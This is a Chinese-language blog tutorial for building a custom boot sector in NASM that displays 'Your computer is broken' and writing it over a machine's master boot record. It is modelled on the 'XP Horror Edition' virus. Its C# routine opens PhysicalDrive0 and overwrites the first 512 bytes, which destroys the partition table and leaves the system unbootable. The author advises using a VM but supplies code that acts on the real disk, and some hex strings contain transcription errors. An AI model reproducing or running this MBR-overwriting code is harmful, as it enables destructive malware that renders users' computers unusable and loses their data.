# 使用汇编生成MBR并使用C#修改


该文章遵循 [Attribution-NonCommercial 4.0 International]()许可协议.

## 前言

之前我分享了一个使用[Csharp(简称C#,后文用此称)](https://learn.microsoft.com/zh-cn/dotnet/csharp/tour-of-csharp/)修改[MBR](https://baike.baidu.com/item/%E4%B8%BB%E5%BC%95%E5%AF%BC%E8%AE%B0%E5%BD%95/7612638)的方法,但是,MBR是由不同进制的字符组成的,我们想要让MBR~~变成
硬盘逻辑锁~~ 显示 我们想要的字符串该怎么办？
   
   修改MBR教程链接 [016281261](?id=016281261)

该操作极其危险,需要对电脑及其熟练的人才能操作,建议在虚拟机内运行,否则,后果自负!

## 开始之前

不知大家是否知道世界上的几大电脑病毒,其中比较恐怖的有 Windows XP horror Edition.用网上简洁一点的话说,该病毒涵盖了以下几个特征:
 1.伪装成XP升级包
 
 2.运行后改注册表
 
 2.运行后改[MBR](#前言)
 
 3.修改系统文件,常见的有 666.sys

 4.进度达`66%`的时候原本伪装的XP升级界面界面变红

 5.界面变红后出现几大恐怖节目

给大家看一下该病毒改完MBR后的效果图:

![XP Horror Edition的效果图](https://ts3.cn.mm.bing.net/th?id=OIP-C.OiD8YLDkDHFoGrBmT0D4SwHaEo)

这就是通过修改MBR实现的.想要改这样的MBR不是一件简单的事.

## 准备工作

前往 [NASM官网(2.16.01下载链接)](https://www.nasm.us/pub/nasm/releasebuilds/2.16.01/win64/nasm-2.16.01-installer-x64.exe) 下载NASM.
使用汇编语言这种底层语言修改MBR是比较简单的事情.

下载完之后打开安装程序,无脑点击Next 下一步即可,安装完成后创建一个空目录.

使用资源管理器打开刚才的空目录,在地址栏键入 `cmd` 并回车,打开命令提示符.

输入`nasm --version`查看版本号,确保nasm没有报错后进行下一步.

在这个空目录里新建MBR.asm,使用Notepad++等专业工具打开,在里面输入以下内容并保存.
```asm
    org 07c00h          ; 使其加载到7c00处
    mov ax, cs
    mov ds, ax
    mov es, ax
    call    DispStr         ; 调用显示字符串例程
    jmp $          ; 无限循环显示
    DispStr:
    mov ax, BootMessage
    mov bp, ax          ; ES:BP = 串地址
    mov cx, 16          ; CX = 串长度
    mov ax, 01301h      ; AH = 13,  AL = 01h
    mov bx, 000ch       ; 页号为0(BH = 0) 黑底红字(BL = 0Ch,高亮)
    mov dl, 0
    int 10h         ; 10h 号中断
    ret
BootMessage:        db  "Your computer is broken"
times   510-($-$$)   db  0   ; 填充剩下空间为512B
dw  0xaa55
```
保存后在打开的命令提示符内输入 `nasm MBR.asm -o MBR.bin`(可以不带 .bin扩展名)

随后在命令提示符内输入
```batch
echo= > boot.img
```
打开 [FloppyWriter](https://raw.githubusercontent.com/huangyingw/FloppyWriter/master/Release/FloppyWriter.exe)(需要先登录Github),点击 `Write FIle to Image`,选择刚才生成的MBR文件,然后会弹出第二个选择框,选择boot.img.

此时如果弹出 成功,表示操作成功.

随后我们可以打开Vmware WorkStation,选择任意虚拟机(创建虚拟机网上有教程,此处不再赘述),点击 "编辑虚拟机设置",


![添加硬件](https://img2.imgtp.com/2024/01/27/t3DmTfqI.png)

再点击"添加(A)",


![选择硬件类型](https://img2.imgtp.com/2024/01/27/CRvXhzMk.png)

选择”软盘驱动器"


![选择软盘加载方式](https://img2.imgtp.com/2024/01/27/wjmfvEjm.png)

再选择“使用软盘镜像文件",点击浏览,


![浏览boot.img](https://img2.imgtp.com/2024/01/27/VLyaOS3C.png)

选择boot.img镜像并点击确定,随后可以启动虚拟机查看文字效果.

![最终演示效果](https://img2.imgtp.com/2024/01/27/qAtJgI41.png)

上述代码由于字节过长,文字显示不全只能显示 "you computer is",需要把文字搞短一点点.使用MBR只能显示很短的文字,可以使用EFI显示文字.后续可能会出如何编写EFI显示文字的教程.

回到正题,我们已经生成了汇编ASM文件.接下来可以使用HexView工具查看MBR的Hex数据,也就是类似于这样开头的数据:

![MBR代码的Hex](https://img2.imgtp.com/2024/01/27/HMEP2ZQb.png)


由于HexView工具本身不支持复制MBR数据,所以我们只能截图并使用文字识别(注意识别出的文字切记要比对Hex原文,无需比对全部,比对一下里面不是`00`的地方即可.)

随后在`Visual Studio`中创建一个 Csharp ConsoleApp (控制台应用) 项目,我以ConsoleApp3为命名,且看`Main`函数的实现代码:
```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace ConsoleApp3
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string hexCode = @"8C C8 8E D8 8E CO E8 02 00 00 ......"; //把你的识别出来的MBR码放进去

            Regex regex = new Regex("[0-9A-Fa-f]{2}");
            MatchCollection matches = regex.Matches(hexCode);

            byte[] scode = new byte[matches.Count];

            for (int i = 0; i < matches.Count; i++)
            {
                byte b = Convert.ToByte(matches[i].Value, 16);
                scode[i] = b;
            }
            string hexString = string.Join(" ", scode.Select(b => "0x" + b.ToString("X2")));
            Console.WriteLine(hexString); //打印转换后的MBR数组
            Console.ReadLine(); //保持窗口不关
        }
    }
}

```
输入完代码按下`Ctrl`+`Shift`+`S`组合键保存代码(此代码可以多次利用,可谓是~~摸鱼好帮手~~ 一劳永逸).此时如果你按下了`F5`,就会打开一个控制台窗口.

![输出效果](https://img2.imgtp.com/2024/01/27/d6DOZveR.png)


如果你看到的是这种类型的(0x开头的数字或字母),代表你的MBR没问题.


不对呀,直接在每个MBR前面加0x不就行了? 不不不,~~懒~~ 一劳永逸不是很好吗?


如果报错了,那么可能是你在文字识别MBR图片的时候某个地方出错了,建议再次检查.

复制输出的那一堆 `0x` 开头的字符(从头到尾)

接下来重点来了,本次修改MBR的方式有一些不同,之前的[016281261](?id=016281261)是直接破坏,而本次是修改,如果乱填MBR码,也可以达到破坏的效果.

话不多说上代码:
```csharp
static void WriteMBR()
{
    byte[] scode = new byte[]
    {
        0x8C,0xC8,0x8E,0xD8,0x8E,0xE8,0x02,0xB9,0x10,0x00, ...                                 
    }; //自己之前通过控制台生成的MBR码
    uint dwBytesReturned;
    byte[] pMBR = new byte[512]; //MBR正好为 512 个字节
    Array.Clear(pMBR, 0, pMBR.Length);

    Array.Copy(scode, pMBR, scode.Length);
    /* pMBR[510] = 0x55; */
    /* pMBR[511] = 0xaa; */  //这两句代码其实是没必要的,如果你仔细留意之前控制台程序打印的MBR,你会发现结尾是有 0x55和0xaa的,加不加都没有关系

    IntPtr hDevice = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
    if (hDevice == IntPtr.Zero || hDevice.ToInt32() == -1)
    {
                MessageBox.Show("CreateFile failed..."); //创建硬盘文件失败
                return;
    }

    DeviceIoControl(hDevice, FSCTL_LOCK_VOLUME, IntPtr.Zero, 0, IntPtr.Zero, 0, out dwBytesReturned, IntPtr.Zero);

    WriteFile(hDevice, pMBR, 512, out dwBytesReturned, IntPtr.Zero);
    DeviceIoControl(hDevice, FSCTL_UNLOCK_VOLUME, IntPtr.Zero, 0, IntPtr.Zero, 0, out dwBytesReturned, IntPtr.Zero);
}
```

好了,本文章就到这里.如果你对我的文章满意,可不可以给我点一个三连或者赞?






 
